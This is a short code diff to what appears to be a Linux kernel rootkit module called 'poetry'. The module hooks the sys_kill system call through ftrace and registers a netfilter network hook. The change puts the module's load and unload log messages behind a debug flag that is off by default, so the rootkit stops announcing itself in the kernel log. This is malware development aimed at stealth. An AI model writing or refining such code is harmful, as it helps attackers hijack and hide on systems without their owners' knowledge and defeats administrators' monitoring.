@@ -2,6 +2,7 @@
 #include "kill.c"
 #include "netfilter.c"
 
+int debug=0;
 static struct ftrace_hook hooks[] = {
         HOOK("sys_kill", hook_kill, &orig_kill),
 };
@@ -14,7 +15,10 @@ static int __init rk_init(void){
     if(err)
         return err;
 
-    printk(KERN_INFO "poetry: loaded\n");
+    if (debug == 1)
+    {
+        printk(KERN_INFO "poetry: loaded\n");
+    }
 
     nf_register_net_hook(&init_net, &my_nfin);
 
@@ -27,7 +31,10 @@ static void __exit rk_cleanup(void){
 
     nf_unregister_net_hook(&init_net, &my_nfin);
 
-    printk(KERN_INFO "poetry: unloaded\n");
+    if (debug == 1)
+    {
+        printk(KERN_INFO "poetry: unloaded\n");
+    }
 }
 
 module_init(rk_init);
